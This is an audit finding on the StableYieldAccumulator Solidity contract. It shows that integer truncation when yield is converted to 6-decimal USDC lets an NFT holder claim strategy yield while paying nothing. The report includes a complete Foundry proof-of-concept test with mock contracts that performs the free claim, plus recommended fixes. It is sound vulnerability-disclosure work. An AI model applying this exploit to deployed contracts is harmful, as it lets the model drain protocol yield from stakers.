<!-- METADATA
Title: Denormalization can floor actualPayment to zero while strategies are drained, allowing free claims
Severity: Medium
Root Cause Link: lib/stable-yield-accumulator/src/StableYieldAccumulator.sol#L489-L517, L605-L628
PoC File: workspace/stable-yield-accumulator/test/poc-M-03.t.sol
-->

# Denormalization can floor actualPayment to zero while strategies are drained, allowing free claims

## Lines of code
https://github.com/Behodler/stable-yield-accumulator/blob/master/src/StableYieldAccumulator.sol#L489-L517
https://github.com/Behodler/stable-yield-accumulator/blob/master/src/StableYieldAccumulator.sol#L605-L628

## Vulnerability details

### Description

`claim()` computes the claimer's payment in two steps. First it accumulates 18-decimal normalized yield (line 484) and applies the discount in 18-decimal space (line 492), then it denormalizes the discounted value back into the reward token's native decimals via `_denormalizeAmount` (line 493). When the reward token has fewer than 18 decimals - e.g. USDC with 6 - `_denormalizeAmount` performs an integer division by `10**(18 - decimals)` (line 622). The yield accounting guard at line 489 only rejects claims with zero NORMALIZED yield; it does not check the post-denormalization value.

The two checks are not equivalent. A small per-claim yield can survive `totalNormalizedYield != 0` and still produce `actualPayment == 0` after denormalization. Concretely, with rewardToken decimals = 6, strategyToken decimals = 18, and a 2% discount, any normalized yield strictly less than `1e12 / 0.98 ~= 1.0204e12` floors to zero in 6-decimal output. A worked example with `totalNormalizedYield = 1e11`:

- `claimerPayment18 = 1e11 * 9800 / 10000 = 9.8e10` (passes the `totalNormalizedYield == 0` guard)
- `actualPayment = 9.8e10 / 1e12 = 0` (truncated by integer division)

Critically, the strategy withdrawals at lines 477-486 happen BEFORE the payment computation. The yield is shipped to the claimer first; only afterwards is the (zero) payment "collected" via `safeTransferFrom(0)` at line 504, which is a no-op on standard ERC20s. The `phlimboAmount > 0` branch is then skipped entirely, so phlimbo never sees the claim. The slippage check at line 496 also passes trivially when the claimer supplies `minRewardTokenSupplied = 0`. The NFT is burned, but the claimer's reward-token balance is unchanged.

This is a deterministic, owner-action-free defect that triggers as soon as the rewardToken is a low-decimal stablecoin (USDC is the canonical reward-token candidate per the contract NatSpec at line 53-54) and per-NFT yield is small. Under normal protocol operation, claim cadence and strategy size will determine whether the truncation window is hit; early-life strategies with low TVL, or strategies tracking small-allocation tokens, are exactly the conditions where it bites.

### Impact

A single NFT holder can withdraw strategy yield without paying any reward token, repeatedly, up to NFT supply. Each successful invocation drains pending yield from every active strategy, transfers it to the claimer, burns one NFT, and routes nothing to phlimbo. The protocol's per-claim invariant - that claimers exchange reward token for yield - is silently broken. The cumulative loss across NFT holders is bounded by NFT supply and the per-claim truncation dust, but the protocol's reward distribution to Limbo stakers is short-changed by exactly the value extracted.

### Proof of Concept

Drop into `lib/stable-yield-accumulator/test/poc-M-03.t.sol` and run with `forge test --match-contract PoC_M_03 -vvv`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/StableYieldAccumulator.sol";
import "../src/interfaces/IStableYieldAccumulator.sol";
import "vault/interfaces/IYieldStrategy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}
contract MockERC20WithDecimals is ERC20 {
    uint8 private _decimals;
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) { _decimals = d; }
    function decimals() public view override returns (uint8) { return _decimals; }
    function mint(address to, uint256 a) external { _mint(to, a); }
}
contract MockPhlimbo {
    address public rewardToken;
    address public yieldAccumulator;
    uint256 public collectRewardCallCount;
    constructor(address rt) { rewardToken = rt; }
    function setYieldAccumulator(address y) external { yieldAccumulator = y; }
    function collectReward(uint256 a) external {
        require(msg.sender == yieldAccumulator, "only sya");
        collectRewardCallCount++;
        IERC20(rewardToken).transferFrom(msg.sender, address(this), a);
    }
}
contract MockYieldStrategy is IYieldStrategy {
    mapping(address => mapping(address => uint256)) public principals;
    mapping(address => mapping(address => uint256)) public yields;
    function setBalances(address t, address a, uint256 p, uint256 y) external { principals[t][a]=p; yields[t][a]=y; }
    function deposit(address, uint256, address) external pure override {}
    function withdraw(address, uint256, address) external pure override {}
    function balanceOf(address t, address a) external view override returns (uint256) { return principals[t][a]+yields[t][a]; }
    function principalOf(address t, address a) external view override returns (uint256) { return principals[t][a]; }
    function totalBalanceOf(address t, address a) external view override returns (uint256) { return principals[t][a]+yields[t][a]; }
    function setClient(address, bool) external pure override {}
    function emergencyWithdraw(uint256) external pure override {}
    function totalWithdrawal(address, address) external pure override {}
    function withdrawFrom(address t, address c, uint256 a, address r) external override {
        IERC20(t).transfer(r, a); yields[t][c]-=a;
    }
}
contract MockNFTMinter {
    struct DispatcherConfig { address dispatcher; uint256 price; uint256 g; bool d; }
    uint256 public nextIndex;
    mapping(uint256 => DispatcherConfig) public _configs;
    mapping(address => bool) public authorizedBurners;
    mapping(address => mapping(uint256 => uint256)) public balances;
    constructor() { nextIndex = 1; }
    function configs(uint256 i) external view returns (address, uint256, uint256, bool) {
        DispatcherConfig memory c = _configs[i]; return (c.dispatcher, c.price, c.g, c.d);
    }
    function registerDispatcher(address d, uint256 p, uint256 g) external {
        _configs[nextIndex] = DispatcherConfig(d, p, g, false); nextIndex++;
    }
    function setAuthorizedBurner(address b, bool a) external { authorizedBurners[b] = a; }
    function mintNFT(address h, uint256 id, uint256 a) external { balances[h][id] += a; }
    function balanceOf(address h, uint256 id) external view returns (uint256) { return balances[h][id]; }
    function burn(address h, uint256 id, uint256 q) external {
        require(authorizedBurners[msg.sender], "na"); balances[h][id] -= q;
    }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

contract PoC_M_03 is Test {
    StableYieldAccumulator internal accumulator;
    MockERC20WithDecimals internal rewardToken; // USDC, 6 decimals
    MockERC20 internal strategyToken;            // DAI-like, 18 decimals
    MockYieldStrategy internal strategy;
    MockPhlimbo internal phlimbo;
    MockNFTMinter internal nftMinter;

    address internal minterAddr;
    address internal claimer;

    uint256 internal constant SUB_TRUNCATION_YIELD = 1e11;

    function setUp() public {
        minterAddr = makeAddr("minter");
        claimer = makeAddr("claimer");

        rewardToken = new MockERC20WithDecimals("USD Coin", "USDC", 6);
        strategyToken = new MockERC20("Dai Stablecoin", "DAI");

        strategy = new MockYieldStrategy();
        accumulator = new StableYieldAccumulator();
        phlimbo = new MockPhlimbo(address(rewardToken));
        phlimbo.setYieldAccumulator(address(accumulator));
        nftMinter = new MockNFTMinter();
        nftMinter.setAuthorizedBurner(address(accumulator), true);
        nftMinter.registerDispatcher(makeAddr("dispatcher1"), 1e18, 100);

        accumulator.setPhlimbo(address(phlimbo));
        accumulator.setRewardToken(address(rewardToken));
        accumulator.setMinter(minterAddr);
        accumulator.setDiscountRate(200);
        accumulator.setNFTMinter(address(nftMinter));
        accumulator.addYieldStrategy(address(strategy), address(strategyToken));
        accumulator.setTokenConfig(address(strategyToken), 18, 1e18);
        accumulator.setTokenConfig(address(rewardToken), 6, 1e18);

        strategy.setBalances(address(strategyToken), minterAddr, 1000e18, SUB_TRUNCATION_YIELD);
        strategyToken.mint(address(strategy), SUB_TRUNCATION_YIELD);
        accumulator.approvePhlimbo(type(uint256).max);
        nftMinter.mintNFT(claimer, 1, 1);

        // Claimer holds zero reward token and has no allowance.
        assertEq(rewardToken.balanceOf(claimer), 0);
        assertEq(rewardToken.allowance(claimer, address(accumulator)), 0);
    }

    function test_M03_FreeYieldViaDenormalizationFloor() public {
        // calculateClaimAmount() previews the bug: yield > 0 but payment = 0.
        assertEq(accumulator.calculateClaimAmount(), 0, "preview: payment is zero, yield non-zero");

        uint256 strategyBefore = strategyToken.balanceOf(address(strategy));
        assertEq(strategyBefore, SUB_TRUNCATION_YIELD, "precondition: strategy funded");

        // Free claim - no reward token, no allowance, just an NFT.
        vm.prank(claimer);
        accumulator.claim(1, 0);

        // Strategy drained, claimer received yield, paid nothing, phlimbo got nothing.
        assertEq(strategyToken.balanceOf(address(strategy)), 0, "strategy drained");
        assertEq(strategyToken.balanceOf(claimer), SUB_TRUNCATION_YIELD, "claimer received yield");
        assertEq(rewardToken.balanceOf(claimer), 0, "claimer paid zero");
        assertEq(rewardToken.balanceOf(address(phlimbo)), 0, "phlimbo got zero");
        assertEq(phlimbo.collectRewardCallCount(), 0, "collectReward never invoked");
        assertEq(nftMinter.balanceOf(claimer, 1), 0, "NFT burned");
    }
}
```

### Tools Used
Manual review, Foundry.

### Recommended Mitigation Steps

Reject claims that cannot collect a meaningful payment after denormalization. Two compatible fixes:

1. Add an explicit guard on `actualPayment` in `claim()`: `if (actualPayment == 0) revert ZeroAmount();` placed immediately after the denormalization on line 493. This preserves the existing semantics for sane parameter combinations while closing the truncation case.
2. Reverse the order of operations: denormalize first, sum in reward-token decimals, then compare against a configurable minimum payment floor. This avoids accumulating sub-truncation contributions from many strategies into a still-truncating total.

Additionally, consider a per-claim minimum-yield gate: refuse claims whose `totalNormalizedYield` is below a threshold proportional to `10**(18 - rewardTokenDecimals)`. This keeps the ZeroAmount guard meaningful when low-decimal reward tokens are used.
